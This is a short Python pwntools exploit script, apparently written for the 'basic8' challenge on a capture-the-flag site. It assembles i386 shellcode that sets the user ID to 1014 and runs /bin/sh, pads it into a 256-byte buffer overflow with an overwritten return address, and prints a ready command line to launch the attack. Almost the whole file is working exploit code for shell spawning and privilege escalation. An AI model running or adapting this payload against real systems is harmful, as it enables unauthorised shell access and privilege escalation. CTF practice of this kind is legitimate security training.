from pwn import * 
#s = ssh(host='pwn.w3challs.com', port=10101, user='basic8', password='basic8')
context.arch = 'i386'
context.os = 'linux'
"""shellcode = asm('''
mov eax, 23 
mov ebx, 1014 
int 0x80 
mov eax, 11 
push 0x00 
push 0x68732f2f 
push 0x6e69622f
mov ebx, esp 
mov ecx, 0x00 
mov edx, 0x00 
syscall 
''')"""
# source: https://shell-storm.org/shellcode/files/shellcode-811.html
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73"+b"\x68\x68\x2f\x62\x69\x6e\x89"+b"\xe3\x89\xc1\x89\xc2\xb0\x0b"+b"\xcd\x80\x31\xc0\x40\xcd\x80"
shellcode = asm('''
xor eax, eax
xor ebx, ebx
xor ecx, ecx 
mov al, 0x31 
int 0x80 
mov edi, eax 
xor edx, edx 
xor eax, eax 
mov al, 0x46 
mov ebx, edi 
mov ecx, edi 
int 0x80
mov al, 23 
mov bx, 1014 
int 0x80
''') +shellcode
assert b'\x00' not in shellcode
#r = s.process(argv=['/home/basic8/basic8', shellcode+b'a'*(256-len(shellcode))+p32(0xdeadb0f)])
#r.interactive()
res = ''
for b in shellcode:
	res += f'\\x{b:02x}'
print(len(shellcode))
print(res)
cmd = f'./basic8 $(python2 -c "print \'{res}\'+\'A\'*{256-len(shellcode)}+\'\\x0f\\xdb\\xea\\x0d\'")'
print(cmd)

